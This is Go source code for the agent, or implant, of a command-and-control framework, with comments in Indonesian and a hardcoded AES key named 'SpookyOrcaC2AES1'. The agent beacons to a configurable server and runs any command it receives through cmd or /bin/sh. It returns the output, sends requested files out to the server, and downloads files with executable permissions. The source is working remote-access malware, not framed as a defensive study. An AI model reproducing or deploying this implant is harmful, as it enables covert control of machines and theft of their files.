package main

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"time"

	"github.com/google/uuid"
)

// Stageless agent – semua config di-embed compile-time
// Gunakan -ldflags untuk menimpa default ini:
//
//	-X 'main.defaultServerURL=http://myserver.com:8080'
//	-X 'main.defaultKey=SomeAESKey16Bytes'
//	-X 'main.defaultInterval=10'
var defaultServerURL = "http://127.0.0.1:8080"
var defaultKey = "SpookyOrcaC2AES1"
var defaultInterval = "5" // string, nanti kita parse ke int

var agentID = uuid.New().String()

func startAgent() {
	fmt.Println("[+] Stageless Agent starting")
	hostname, _ := os.Hostname()

	// Parse defaultInterval
	beaconSec, err := strconv.Atoi(defaultInterval)
	if err != nil {
		beaconSec = 5
	}

	for {
		// Kirim info ke /ping
		info := fmt.Sprintf("%s|%s", hostname, agentID)
		encryptedInfo, _ := encryptAES(info, defaultKey)
		encodedInfo := url.QueryEscape(encryptedInfo)

		resp, err := http.Get(fmt.Sprintf("%s/ping?info=%s",
			defaultServerURL, encodedInfo))
		if err != nil || (resp.StatusCode != http.StatusOK &&
			resp.StatusCode != http.StatusNoContent) {
			time.Sleep(3 * time.Second)
			continue
		}

		commandBytes, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		command, err := decryptAES(string(commandBytes), defaultKey)
		if err == nil && command != "" {
			switch {
			case len(command) > 6 && command[:6] == "EXFIL|":
				exfiltrateFile(command[6:], defaultServerURL, defaultKey)
			case len(command) > 9 && command[:9] == "DOWNLOAD|":
				downloadFile(command[9:], defaultServerURL, defaultKey)
			default:
				out, err := executeCommand(command)
				if err != nil {
					out = fmt.Sprintf("Error: %s", err.Error())
				}
				encryptedResult, _ := encryptAES(out, defaultKey)
				http.Post(fmt.Sprintf("%s/result?id=%s&type=cmd",
					defaultServerURL, agentID),
					"text/plain",
					bytes.NewBufferString(encryptedResult))
			}
		}

		time.Sleep(time.Duration(beaconSec) * time.Second)
	}
}

// Jalankan perintah OS
func executeCommand(cmd string) (string, error) {
	if runtime.GOOS == "windows" {
		out, err := exec.Command("cmd", "/C", cmd).Output()
		return string(out), err
	} else {
		out, err := exec.Command("/bin/sh", "-c", cmd).Output()
		return string(out), err
	}
}

// Exfil file – kirim ke /result dengan type=exfil
func exfiltrateFile(filepath, serverURL, encryptionKey string) {
	fileData, err := os.ReadFile(filepath)
	if err != nil {
		fmt.Println("[-] Error reading file:", err)
		return
	}
	encodedData := base64.StdEncoding.EncodeToString(fileData)
	encryptedData, _ := encryptAES(encodedData, encryptionKey)

	resp, err := http.Post(fmt.Sprintf("%s/result?id=%s&type=exfil&filename=%s",
		serverURL, agentID, url.QueryEscape(filepath)),
		"text/plain", bytes.NewBufferString(encryptedData))
	if err != nil {
		fmt.Println("[-] Failed to exfiltrate file:", err)
		return
	}
	resp.Body.Close()
	fmt.Println("[+] File exfiltrated:", filepath)
}

// Download file dari /download, simpan di disk
func downloadFile(filename, serverURL, encryptionKey string) {
	downloadURL := fmt.Sprintf("%s/download?filename=%s", serverURL, url.QueryEscape(filename))
	resp, err := http.Get(downloadURL)
	if err != nil {
		fmt.Println("[-] Failed to download file:", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		fmt.Println("[-] Server returned status:", resp.Status)
		return
	}

	data, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("[-] Error reading downloaded file:", err)
		return
	}

	localPath := filepath.Base(filename)
	err = os.WriteFile(localPath, data, 0755)
	if err != nil {
		fmt.Println("[-] Error saving file:", err)
		return
	}

	fmt.Println("[+] File downloaded and saved as:", localPath)
}
